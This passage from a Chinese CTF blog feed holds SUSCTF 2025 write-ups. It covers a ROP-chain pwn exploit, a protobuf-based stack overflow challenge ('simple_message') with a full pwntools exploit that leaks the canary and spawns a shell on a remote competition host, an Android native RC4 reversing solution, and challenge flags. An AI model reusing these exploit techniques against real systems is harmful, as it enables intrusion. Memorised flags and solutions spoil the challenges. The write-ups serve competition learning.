class="number">0x2002</span></span><br><span class="line">bss_addr = pie_base + <span class="number">0x4000</span> + <span class="number">0x500</span></span><br><span class="line"><span class="comment"># 0x0000000000005ae0 : mov rdx, qword ptr [rbp - 0x518] ; syscall</span></span><br><span class="line"><span class="comment"># 0x00000000000067b2 : mov edx, 0xc9ffffdf ; ret</span></span><br><span class="line"><span class="comment"># rax=1,rdi=1,rsi=content_stack,edx = 0xc9ffffdf</span></span><br><span class="line"><span class="comment"># 0x0000000000006209: mov qword ptr [rbp - 8], rdi; mov rax, qword ptr [rbp - 8]; pop rbp; ret; 等价于mov rax,rdi; pop rbp; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000000620d: mov rax, qword ptr [rbp - 8]; pop rbp; ret; </span></span><br><span class="line"><span class="comment"># 0x000000000000604c: mov edi, 1; call 0x5fe9; pop rbp; ret; </span></span><br><span class="line"><span class="comment"># 0x0000000000005030: mov rsi, qword ptr [rbp - 0x130]; mov edx, dword ptr [rbp - 0x128]; syscall; </span></span><br><span class="line">mov_rdx = libc_base + <span class="number">0x67b2</span></span><br><span class="line">mov_edi = libc_base + <span class="number">0x604c</span></span><br><span class="line">mov_rax_rdi = libc_base + <span class="number">0x6209</span></span><br><span class="line">mov_rsi = libc_base + <span class="number">0x5030</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]pie_base:&#x27;</span>,<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]content_stack:&#x27;</span>,<span class="built_in">hex</span>(content_stack))</span><br><span class="line">p.sendline(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">ret_stack = leak_stack + <span class="number">0x86</span></span><br><span class="line">gad_start = ret_stack - <span class="number">0x80</span> + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]gad_start:&quot;</span>,<span class="built_in">hex</span>(gad_start))</span><br><span class="line">payload = <span class="string">b&#x27;exit.run&#x27;</span>+cyclic(<span class="number">0x6</span>+<span class="number">0x8</span>)+p64(mov_rdx)+p64(mov_edi)</span><br><span class="line">payload+= p64(ret_stack-<span class="number">0x8</span>)+p64(mov_rax_rdi)+p64(ret_stack-<span class="number">0x10</span>+<span class="number">0x120</span>)+p64(mov_rsi)</span><br><span class="line">payload+=cyclic(<span class="number">0x87</span>-<span class="number">0x9</span>-<span class="number">0x58</span>-<span class="number">0x6</span>)+p64(content_stack)+p64(<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(gad_start)+p8(<span class="number">0x7f</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;liblayer.so&#x27;)</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001526159.png" alt="image-20251007001526159"></p><h3 id="monitor-flag">monitor-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;1s_s4fe_t0_put_So_NNuch_Dat4_in_7he_l0g_0088e23e15df&#125;</span><br></pre></td></tr></table></figure><h2 id="simple_message">simple_message</h2><p>大二的时候安装了一下<code>protobuf</code>的环境，但是关于<code>protobuf</code>的pwn和逆向当时鸽了，没学。这个是比赛的时候现学的。难点在逆向。</p><h3 id="simple_message-分析">simple_message-分析</h3><ul><li>首先查看一下保护机制，没开<code>pie</code>，这题是静态编译的，所以<code>canary</code>这个检测是有错误的，实际上程序是有开启<code>canary</code>保护的。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001821715.png" alt="image-20251007001821715"></p><ul><li>接下来就是逆向一下程序：</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001921249.png" alt="image-20251007001921249"></p><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007001942423.png" alt="image-20251007001942423"></p><ul><li>逆向过程不多说了，直接说漏洞点，漏洞点其实比较简单。在<code>show()</code>函数这边，其实是有一个泄露的，<code>buf</code>这边只有<code>264字节</code>，而输出其实可以输出<code>512</code>字节，这样就可以将<code>canary</code>、<code>stack_addr</code>给泄露出来了</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002211941.png" alt="image-20251007002211941"></p><ul><li>而<code>edit</code>这个函数里面是存在栈溢出漏洞的，难点主要在于逆向<code>protobuf</code>结构体。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002431744.png" alt="image-20251007002431744"></p><ul><li>首先要确定<code>protobuf</code>结构体在程序中的位置，直接定位<code>message_unpack</code>这个函数的地址个参数，这个参数存放的就是<code>protobuf</code>的一个结构体</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002529059.png" alt="image-20251007002529059"></p><ul><li>在<code>descriptor</code>下方其实就是我们消息的结构体，直接开始逆向<code>message_name</code>、<code>message_id</code>、<code>message_lable</code>、<code>message_type</code></li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002734985.png" alt="image-20251007002734985"></p><ul><li>其中<code>command</code>还是个枚举类型，还需要逆向枚举类型</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007002900197.png" alt="image-20251007002900197"></p><ul><li>之后还原出结构体，使用<code>protoc --python_out=. msg.proto</code>，将其编译成<code>.py</code>文件</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; # 不知道是proto2还是proto3,直接就先使用proto3了</span><br><span class="line"><span class="keyword">message </span><span class="title class_">msg</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> username=<span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> password=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">enum </span><span class="title class_">Command</span> &#123;</span><br><span class="line">        CMD_UNKNOWN = <span class="number">0</span>;</span><br><span class="line">        CMD_LOGIN = <span class="number">1</span>;</span><br><span class="line">        CMD_ECHO = <span class="number">2</span>;</span><br><span class="line">        CMD_PROCESS = <span class="number">3</span>;</span><br><span class="line">        CMD_EXIT = <span class="number">4</span>;</span><br><span class="line">        CMD_SHOW = <span class="number">5</span>;</span><br><span class="line">        CMD_SPECIAL = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Command command=<span class="number">3</span>;</span><br><span class="line">    <span class="type">bytes</span> data=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int32</span> size=<span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>之后还发现有<code>system</code>和<code>/bin/sh</code>，剩下的就没难度了</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007003100244.png" alt="image-20251007003100244"></p><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/Snipaste_2025-10-07_00-31-10.png" alt="Snipaste_2025-10-07_00-31-10"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> msg_pb2</span><br><span class="line"><span class="comment">#p = process(&#x27;./simple_message_patched&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;106.14.191.23&quot;</span>,<span class="number">52871</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_echo</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">2</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_edit</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">3</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_show</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">5</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proto_hook</span>(<span class="params">data,size</span>):</span><br><span class="line">    msg = msg_pb2.msg()</span><br><span class="line">    msg.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    msg.password = <span class="string">&quot;P@ssw0rd123&quot;</span></span><br><span class="line">    msg.command = <span class="number">6</span></span><br><span class="line">    msg.data = data</span><br><span class="line">    msg.size = size</span><br><span class="line">    <span class="keyword">return</span> msg.SerializeToString()</span><br><span class="line"></span><br><span class="line">payload = proto_echo(<span class="string">b&#x27;aaa&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">payload = proto_edit(<span class="string">b&#x27;bbbb&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">payload = proto_show(<span class="string">b&#x27;aasdas&#x27;</span>,<span class="number">264</span>+<span class="number">8</span>+<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;&gt; Enter message length:&#x27;</span>,payload)</span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;&gt; Enter message length:&#x27;</span>)[-<span class="number">7</span>-<span class="number">0x20</span>-<span class="number">0x10</span>:-<span class="number">0x10</span>-<span class="number">0xa</span>]</span><br><span class="line">leak_stack = leak[-<span class="number">6</span>:]</span><br><span class="line">canary = leak[-<span class="number">6</span>-<span class="number">8</span>:-<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak_stack&#x27;</span>,leak_stack.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] canary:&#x27;</span>,canary.<span class="built_in">hex</span>())</span><br><span class="line">leak_stack = u64(leak_stack.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">canary = u64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] leak_stack&#x27;</span>,<span class="built_in">hex</span>(leak_stack))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] canary&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi = <span class="number">0x402748</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">system_addr = <span class="number">0x401FD0</span></span><br><span class="line">sh_addr = <span class="number">0x4C1125</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(canary) + p64(leak_stack)+p64(pop_rdi) + p64(sh_addr)+p64(system_addr)</span><br><span class="line">payload = proto_edit(payload,<span class="number">310</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000402748 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>这边也附上<code>msg_pb2.py</code>文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># NO CHECKED-IN PROTOBUF GENCODE</span></span><br><span class="line"><span class="comment"># source: msg.proto</span></span><br><span class="line"><span class="comment"># Protobuf Python Version: 5.29.1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> runtime_version <span class="keyword">as</span> _runtime_version</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line">_runtime_version.ValidateProtobufRuntimeVersion(</span><br><span class="line">    _runtime_version.Domain.PUBLIC,</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    <span class="number">29</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;msg.proto&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\tmsg.proto\&quot;\xdb\x01\n\x03msg\x12\x10\n\x08username\x18\x01 \x01(\t\x12\x10\n\x08password\x18\x02 \x01(\t\x12\x1d\n\x07\x63ommand\x18\x03 \x01(\x0e\x32\x0c.msg.Command\x12\x0c\n\x04\x64\x61ta\x18\x04 \x01(\x0c\x12\x0c\n\x04size\x18\x05 \x01(\x05\&quot;u\n\x07\x43ommand\x12\x0f\n\x0b\x43MD_UNKNOWN\x10\x00\x12\r\n\tCMD_LOGIN\x10\x01\x12\x0c\n\x08\x43MD_ECHO\x10\x02\x12\x0f\n\x0b\x43MD_PROCESS\x10\x03\x12\x0c\n\x08\x43MD_EXIT\x10\x04\x12\x0c\n\x08\x43MD_SHOW\x10\x05\x12\x0f\n\x0b\x43MD_SPECIAL\x10\x06\x62\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_<span class="built_in">globals</span> = <span class="built_in">globals</span>()</span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _<span class="built_in">globals</span>)</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;msg_pb2&#x27;</span>, _<span class="built_in">globals</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> _descriptor._USE_C_DESCRIPTORS:</span><br><span class="line">  DESCRIPTOR._loaded_options = <span class="literal">None</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG&#x27;</span>]._serialized_start=<span class="number">14</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG&#x27;</span>]._serialized_end=<span class="number">233</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG_COMMAND&#x27;</span>]._serialized_start=<span class="number">116</span></span><br><span class="line">  _<span class="built_in">globals</span>[<span class="string">&#x27;_MSG_COMMAND&#x27;</span>]._serialized_end=<span class="number">233</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007003401749.png" alt="image-20251007003401749"></p><h3 id="simple_message-flag">simple_message-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8bded2c3ed85&#125;</span><br></pre></td></tr></table></figure><h1 id="re">RE</h1><h2 id="android-native">android-native</h2><h3 id="android-native-分析">android-native-分析</h3><ul><li>附件是一个<code>apk</code>文件，并且题目是<code>android-native</code>，应该主要考察的就是<code>native</code>层的逆向。还是按照步骤一步一步来，先将apk安装到雷电模拟器后再打开。发现就是这么一个简单的界面。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225103355.png" alt="image-20251006225103355"></p><ul><li>然后再使用<code>jadx</code>进行<code>java</code>层的逆向，看看<code>java</code>层有没一些细节的东西。然而并没有，<code>flag</code>的判断逻辑全部都在<code>native</code>层。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225154434.png" alt="image-20251006225154434"></p><ul><li>那就直接进行<code>native</code>层的逆向分析，将<code>apk</code>文件解压缩，翻到<code>lib</code>文件夹，发现竟然有<code>x86_64</code>的<code>so</code>文件，那就直接逆向<code>x86_64</code>的<code>so</code>文件。还是<code>x86_64</code>的汇编看得舒服。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225323935.png" alt="image-20251006225323935"></p><ul><li>使用<code>IDA pro</code>反编译后发现加密逻辑主要就在这两个函数中。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225504844.png" alt="image-20251006225504844"></p><ul><li>对于<code>sub_950</code>来说，是一个异或赋值操作。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225535932.png" alt="image-20251006225535932"></p><ul><li>而在<code>sub_A60</code>这边会发现密文，并且密钥其实就是上面异或后的东西。并且根据特征与积累，再加上<code>AI</code>分析一下基本上就能判断出<code>sub_A60</code>就是一个<code>RC4</code>加密算法。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225752755.png" alt="image-20251006225752755"></p><ul><li>先求出异或后的密钥：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;1m1r6rqro1l~dr&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">0</span>])),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">1</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">2</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">3</span>])^<span class="number">4</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">4</span>])^<span class="number">5</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">5</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">6</span>])^<span class="number">4</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">7</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">8</span>])^<span class="number">9</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">9</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">10</span>])^<span class="number">9</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">11</span>])^<span class="number">8</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">12</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">13</span>])),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 1l0v3susf0ever</span></span><br></pre></td></tr></table></figure><ul><li>然后直接在线<code>rc4</code>解密即可。</li></ul><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225929338.png" alt="image-20251006225929338"></p><p><img src="/2025/10/08/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225948930.png" alt="image-20251006225948930"></p><h3 id="android-native-flag">android-native-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;de094624-8f5b-44dc-<span class="number">8</span>10c-58132a2b5ea3&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：国际赛打不动越打越自闭，打打国内的顺便复建一下pwn。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-向量与线性空间</title>
    <link href="http://iyheart.github.io/2025/10/03/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%A9%BA%E9%97%B4/"/>
    <id>http://iyheart.github.io/2025/10/03/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%A9%BA%E9%97%B4/</id>
    <published>2025-10-03T08:29:51.000Z</published>
    <updated>2025-10-29T09:21:01.922Z</updated>
    
